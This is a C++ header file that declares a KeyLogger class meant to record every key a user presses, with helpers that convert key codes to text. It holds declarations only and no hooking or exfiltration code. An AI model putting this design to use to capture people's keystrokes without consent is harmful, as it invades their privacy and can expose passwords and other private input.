#pragma once

#include <string>
#include <iostream>
#include <fstream>
#include "Logger.h"

using namespace std;

/*
	Responsible for logging all the user key presses.
*/
class KeyLogger
{
private:
	Logger* logger;

	/*
		Return the textual representation of the given key,
		considering other keys like CTRL or SHIFT.
	*/
	wstring GetKeyText(int keyCode);

	bool IsLetter(int keyCode);
	wstring GetLetterText(char letter);


public:
	KeyLogger(Logger* logger);
	void StartLogging();
};

